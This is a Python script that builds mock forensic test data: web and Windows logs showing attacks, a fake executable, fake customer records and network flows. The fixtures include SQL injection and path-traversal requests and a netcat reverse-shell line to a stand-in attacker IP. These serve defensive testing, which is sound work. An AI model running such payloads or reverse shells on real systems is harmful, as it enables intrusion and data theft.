# scripts/generate_mock_data.py
"""
Generate realistic mock forensic data for testing
"""
import os
from pathlib import Path
from datetime import datetime, timedelta
import random
import csv


def create_directories():
    """Create necessary directories"""
    dirs = [
        './mock_data/logs',
        './mock_data/files',
        './mock_data/network'
    ]
    for dir_path in dirs:
        Path(dir_path).mkdir(parents=True, exist_ok=True)


def generate_apache_access_log():
    """Generate mock Apache access log with suspicious activity"""
    log_path = './mock_data/logs/apache_access.log'
    
    ips = [
        '192.168.1.100',  # Normal user
        '192.168.1.105',  # Normal user
        '203.0.113.45',   # Attacker IP
        '198.51.100.78'   # Scanner IP
    ]
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'sqlmap/1.5.2',  # SQL injection tool
        'Nikto/2.1.6'    # Vulnerability scanner
    ]
    
    paths = [
        '/index.html',
        '/about.html',
        '/login.php',
        '/admin/config.php',
        "/admin/login.php?id=1' OR '1'='1",  # SQL injection
        '/admin/../../../etc/passwd',  # Path traversal
        '/.git/config',  # Sensitive file access
    ]
    
    base_time = datetime.now() - timedelta(hours=2)
    
    with open(log_path, 'w') as f:
        for i in range(500):
            timestamp = base_time + timedelta(seconds=i*10)
            timestamp_str = timestamp.strftime('%d/%b/%Y:%H:%M:%S +0000')
            
            # 80% normal traffic, 20% suspicious
            if random.random() < 0.8:
                ip = random.choice(ips[:2])
                path = random.choice(paths[:3])
                ua = random.choice(user_agents[:2])
                status = random.choice([200, 200, 200, 304])
            else:
                ip = random.choice(ips[2:])
                path = random.choice(paths[3:])
                ua = random.choice(user_agents[2:])
                status = random.choice([200, 403, 404, 500])
            
            size = random.randint(100, 5000)
            
            log_line = f'{ip} - - [{timestamp_str}] "GET {path} HTTP/1.1" {status} {size} "-" "{ua}"\n'
            f.write(log_line)
    
    print(f"Generated: {log_path}")


def generate_windows_security_log():
    """Generate mock Windows security event log"""
    log_path = './mock_data/logs/windows_security.log'
    
    event_ids = {
        4624: 'Successful logon',
        4625: 'Failed logon',
        4672: 'Special privileges assigned',
        4720: 'User account created',
        4732: 'Member added to security-enabled group'
    }
    
    usernames = ['john.doe', 'admin', 'service_account', 'attacker']
    workstations = ['WORKSTATION01', 'WORKSTATION02', 'UNKNOWN']
    
    base_time = datetime.now() - timedelta(hours=3)
    
    with open(log_path, 'w') as f:
        f.write("EventID,TimeGenerated,Username,Workstation,Description\n")
        
        for i in range(300):
            timestamp = base_time + timedelta(seconds=i*20)
            timestamp_str = timestamp.strftime('%Y-%m-%d %H:%M:%S')
            
            # Simulate attack pattern: multiple failed logins followed by success
            if i >= 100 and i <= 120:
                event_id = 4625  # Failed logon
                username = 'admin'
                workstation = 'UNKNOWN'
            elif i == 121:
                event_id = 4624  # Successful logon after brute force
                username = 'admin'
                workstation = 'UNKNOWN'
            elif i == 122:
                event_id = 4720  # User account created
                username = 'backdoor_user'
                workstation = 'UNKNOWN'
            else:
                event_id = random.choice(list(event_ids.keys()))
                username = random.choice(usernames[:3])
                workstation = random.choice(workstations[:2])
            
            description = event_ids[event_id]
            
            f.write(f'{event_id},{timestamp_str},{username},{workstation},{description}\n')
    
    print(f"Generated: {log_path}")


def generate_suspicious_executable():
    """Generate mock suspicious executable metadata"""
    file_path = './mock_data/files/suspicious_executable.exe'
    
    # Create a small file with suspicious content markers
    content = b'MZ\x90\x00'  # PE header
    content += b'\x00' * 100
    content += b'This is not a real executable but simulates one for testing'
    content += b'nc.exe -e cmd.exe 203.0.113.45 4444'  # Suspicious command
    
    with open(file_path, 'wb') as f:
        f.write(content)
    
    print(f"Generated: {file_path}")


def generate_confidential_data():
    """Generate mock confidential data file"""
    file_path = './mock_data/files/confidential_data.csv'
    
    with open(file_path, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['UserID', 'Name', 'Email', 'SSN', 'CreditCard'])
        
        for i in range(100):
            writer.writerow([
                f'USR{1000+i}',
                f'User {i}',
                f'user{i}@company.com',
                f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}',
                f'{random.randint(4000,4999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}'
            ])
    
    print(f"Generated: {file_path}")


def generate_network_capture():
    """Generate mock network capture metadata (simplified)"""
    file_path = './mock_data/network/capture.pcap'
    
    # Create CSV representation of network traffic
    csv_path = './mock_data/network/network_traffic.csv'
    
    base_time = datetime.now() - timedelta(hours=1)
    
    with open(csv_path, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Timestamp', 'SourceIP', 'DestIP', 'Protocol', 'Port', 'Bytes', 'Flags'])
        
        for i in range(1000):
            timestamp = base_time + timedelta(seconds=i*3)
            timestamp_str = timestamp.strftime('%Y-%m-%d %H:%M:%S')
            
            # 90% normal traffic, 10% suspicious
            if random.random() < 0.9:
                src_ip = f'192.168.1.{random.randint(100, 110)}'
                dst_ip = '8.8.8.8'
                protocol = random.choice(['TCP', 'UDP'])
                port = random.choice([80, 443, 53])
                flags = 'SYN,ACK'
            else:
                # Suspicious: data exfiltration pattern
                src_ip = '192.168.1.105'
                dst_ip = '203.0.113.45'  # External suspicious IP
                protocol = 'TCP'
                port = 4444  # Common backdoor port
                flags = 'PSH,ACK'
            
            byte_count = random.randint(100, 50000) if port == 4444 else random.randint(100, 1500)
            
            writer.writerow([timestamp_str, src_ip, dst_ip, protocol, port, byte_count, flags])
    
    # Create a placeholder for the actual PCAP file
    with open(file_path, 'wb') as f:
        f.write(b'PCAP_MOCK_DATA_PLACEHOLDER')
    
    print(f"Generated: {csv_path}")
    print(f"Generated: {file_path} (placeholder)")


def generate_all_mock_data():
    """Generate all mock data"""
    print("Generating mock forensic data...\n")
    
    create_directories()
    
    generate_apache_access_log()
    generate_windows_security_log()
    generate_suspicious_executable()
    generate_confidential_data()
    generate_network_capture()
    
    print("\n✓ All mock data generated successfully!")
    print("\nGenerated files:")
    print("- ./mock_data/logs/apache_access.log")
    print("- ./mock_data/logs/windows_security.log")
    print("- ./mock_data/files/suspicious_executable.exe")
    print("- ./mock_data/files/confidential_data.csv")
    print("- ./mock_data/network/capture.pcap")
    print("- ./mock_data/network/network_traffic.csv")


if __name__ == "__main__":
    generate_all_mock_data()